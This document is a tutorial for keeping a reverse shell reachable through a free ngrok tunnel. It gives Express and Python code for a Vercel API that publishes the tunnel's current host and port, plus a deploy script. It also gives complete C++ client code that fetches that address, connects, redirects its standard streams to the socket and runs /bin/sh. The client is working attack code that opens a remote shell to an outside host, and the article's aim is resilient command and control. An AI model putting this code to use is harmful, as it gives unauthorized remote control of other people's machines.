# Dynamic Reverse Shell Tunnel with Vercel & ngrok

A common limitation of the **free version of ngrok** is that the public hostname and port change every time you restart the tunnel. This means any reverse shell code relying on a **hardcoded hostname or port** will break whenever the tunnel restarts.

One “official” fix would be to buy a **professional ngrok account** with reserved domains and fixed ports—but, let’s be honest, most of us are broke 😅.

Instead, we can implement a **creative workaround**: host a **small API on a server** (like Vercel) that always returns the **current hostname and port** of your ngrok tunnel. By fetching these values dynamically, your reverse shell remains reliable even if the tunnel changes.

In short: **never hardcode ngrok hostnames or ports**. Let your code query a small API for the latest info, keeping your reverse shell functional without spending a dime.

---

## Deploying a Tunnel API on Vercel

We’ll create a small Vercel app to provide the **current ngrok hostname and port** dynamically.

---

### 1. Initialize a New Node.js Project

```bash
npm init -y
```

This creates a `package.json` with default settings.

---

### 2. Install Vercel CLI

```bash
sudo npm i -g vercel
```

> Allows deploying your app to Vercel directly from the terminal.

---

### 3. Install Express

```bash
npm install express
```

Express is used to create a simple API endpoint that serves the tunnel information.

---

### 4. Deploy to Vercel

```bash
npx vercel --prod
```

* The `--prod` flag deploys the app to a production URL.
* After deployment, the API will be accessible publicly, providing the **current hostname and port** for your reverse shell.

---

## 5. Express API Code

Create `index.js` with the following content:

```js
const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();

// PORT for Vercel deployment
const port = process.env.PORT || 3000;

// Route to provide ngrok tunnel info
app.get("/tunnel", (req, res) => {
  const jsonPath = path.join(__dirname, "tunnel.json");

  fs.readFile(jsonPath, "utf8", (err, data) => {
    if (err) {
      console.error("Error reading JSON file:", err);
      return res.status(500).json({ error: "Could not read tunnel info" });
    }
    try {
      const jsonData = JSON.parse(data);
      res.json(jsonData);
    } catch (parseErr) {
      console.error("Error parsing JSON:", parseErr);
      res.status(500).json({ error: "Invalid JSON format" });
    }
  });
});

// Start server
app.listen(port, () => {
  console.log(`API running on port ${port}`);
});
```

This API reads the latest tunnel information from `tunnel.json` and serves it over `/tunnel`.

---

## 6. Python Script to Update Tunnel Info

Create `get_addr.py` to fetch the current ngrok TCP tunnel and write it to `tunnel.json`:

```python
import requests
import json
import os

# ngrok local API endpoint
url = "http://127.0.0.1:4040/api/tunnels"

try:
    resp = requests.get(url)
    resp.raise_for_status()
    data = resp.json()

    # Loop through tunnels
    for tunnel in data.get("tunnels", []):
        if tunnel["proto"] == "tcp":
            hostname = tunnel["public_url"].split("://")[1].split(":")[0]
            port = int(tunnel["public_url"].split(":")[-1])

            tunnel_data = {
                "hostname": hostname,
                "port": port
            }

            # Write to tunnel.json in the same directory
            json_path = os.path.join(os.path.dirname(__file__), "tunnel.json")
            with open(json_path, "w") as f:
                json.dump(tunnel_data, f, indent=2)

            print(f"Updated tunnel.json with hostname: {hostname}, port: {port}")

except requests.exceptions.RequestException as e:
    print("Error fetching ngrok tunnels:", e)
```

---

## 7. Automating Deployment

Create a bash script `deploy.sh` to automate updating `tunnel.json` and deploying to Vercel:

```bash
#!/bin/bash

# Exit immediately if any command fails
set -e

# Run the Python script to update tunnel.json
echo "[*] Running Python script to update tunnel.json..."
python3 get_addr.py

# Deploy to Vercel production
echo "[*] Deploying to Vercel..."
npx vercel --prod

echo "[*] Done."
```

---


## Updating the Client Code

To make your reverse shell resilient to changing ngrok hostnames and ports, we update the client code to **fetch tunnel information dynamically** from the Vercel API.

---

### 1. Include Required Libraries
```cpp
#include <iostream>
#include <string>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

using json = nlohmann::json;
```
- `libcurl` handles HTTP requests to fetch the API response.
- `nlohmann/json` parses the JSON returned by the API.
- Standard POSIX headers are used for socket connections and I/O redirection.

---

### 2. Callback for Curl
```cpp
size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string *)userp)->append((char *)contents, size * nmemb);
    return size * nmemb;
}
```
- Captures the HTTP response from the Vercel API into a `std::string`.

---

### 3. Main Function
```cpp
int main()
{
    std::string url = "https://my-api-wine-iota.vercel.app/tunnel";
    std::string readBuffer;

    CURL *curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << "\n";
            return 1;
        }
        curl_easy_cleanup(curl);
    }

    // Parse JSON response
    json j = json::parse(readBuffer);
    std::string hostname = j["hostname"];
    int port = j["port"];
    std::string port_str = std::to_string(port);

    std::cout << "Hostname: " << hostname << "\n";
    std::cout << "Port: " << port << "\n";

    // Create TCP socket
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int status = getaddrinfo(hostname.c_str(), port_str.c_str(), &hints, &res);
    if (status != 0)
    {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return 1;
    }

    int sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sockfd == -1)
    {
        perror("socket");
        freeaddrinfo(res);
        return 1;
    }

    if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1)
    {
        perror("connect");
        close(sockfd);
        freeaddrinfo(res);
        return 1;
    }

    printf("Connected to %s:%s\n", hostname.c_str(), port_str.c_str());

    // Redirect stdin, stdout, stderr
    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }

    // Execute shell
    execve("/bin/sh", NULL, NULL);

    return 0;
}
```

---

### ✅ Key Improvements
1. **Dynamic host and port**: No more hardcoding; the client fetches the latest tunnel info from your Vercel API.  
2. **Robust connection**: Works reliably even if the ngrok tunnel changes.
3. **Minimal external dependencies**: Only `libcurl` and `nlohmann/json` are needed.

---

### 🔹 Next Steps
- Compile the code:
```bash
g++ -std=c++17 reverse_shell_client.cpp -o reverse_shell_client -lcurl
```
- Ensure your **Vercel API** is deployed and running.  
- Start your **ngrok TCP tunnel**, run the Python updater, and deploy the API.  
- Run the client:  
```bash
./reverse_shell_client
```
- It will automatically fetch the **current hostname and port**, connect, and provide an interactive shell.

---
